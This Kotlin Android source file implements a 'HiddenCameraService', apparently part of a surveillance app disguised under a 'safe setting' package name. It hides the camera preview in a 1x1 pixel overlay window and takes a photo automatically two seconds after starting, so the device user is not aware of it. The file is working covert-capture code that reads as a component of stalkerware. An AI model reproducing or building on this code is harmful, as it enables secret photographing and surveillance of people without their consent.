package com.safe.setting.app.utils.hiddenCameraServiceUtils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.Handler
import android.os.Looper
import android.util.Size
import androidx.core.app.ActivityCompat
import android.view.ViewGroup
import android.view.WindowManager
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.isFrontCameraAvailable
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraResolution
import com.pawegio.kandroid.d



class HiddenCameraService(private val context: Context, private val cameraCallbacks: CameraCallbacks) {

    private var mWindowManager: WindowManager? = null
    private var mCameraPreview: CameraPreview? = null

    fun startCamera(cameraConfig: CameraConfig) {
        if (!context.canOverDrawOtherApps()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION)
        } else if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            cameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE)
        } else if (cameraConfig.facing == CameraFacing.FRONT_FACING_CAMERA && !context.isFrontCameraAvailable()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA)
        } else {
            CameraPreview.cameraId = cameraConfig.facing.toString()

            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val characteristics = cameraManager.getCameraCharacteristics(CameraPreview.cameraId)

            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val pictureSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val cameraSize: Size? = when (cameraConfig.resolution) {
                CameraResolution.MEDIUM_RESOLUTION -> pictureSizes?.get(pictureSizes.size / 2)
                CameraResolution.SLOW_RESOLUTION -> pictureSizes?.last()
                else -> throw RuntimeException("Invalid camera resolution.")
            }
            CameraPreview.cameraSize = cameraSize

            if (mCameraPreview == null) mCameraPreview = addPreView()
            mCameraPreview!!.startCameraInternal(cameraConfig)
            Handler(Looper.getMainLooper()).postDelayed({ takePicture() }, 2000)
        }
    }

    private fun takePicture() {
        if (mCameraPreview != null) {
            mCameraPreview!!.takePictureInternal()
        } else {
            throw RuntimeException("Background camera not initialized. Call startCamera() to initialize the camera.")
        }
    }

    fun stopCamera() {
        if (mCameraPreview != null) {
            mWindowManager?.removeView(mCameraPreview)
            mCameraPreview!!.stopPreviewAndFreeCamera()
            mCameraPreview = null
            d(TAG, "camera stop")
        }
    }

    private fun addPreView(): CameraPreview {
        val cameraSourceCameraPreview = CameraPreview(context, cameraCallbacks)
        cameraSourceCameraPreview.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )

        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val params = WindowManager.LayoutParams(
            1, 1,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        mWindowManager?.addView(cameraSourceCameraPreview, params)
        return cameraSourceCameraPreview
    }
}
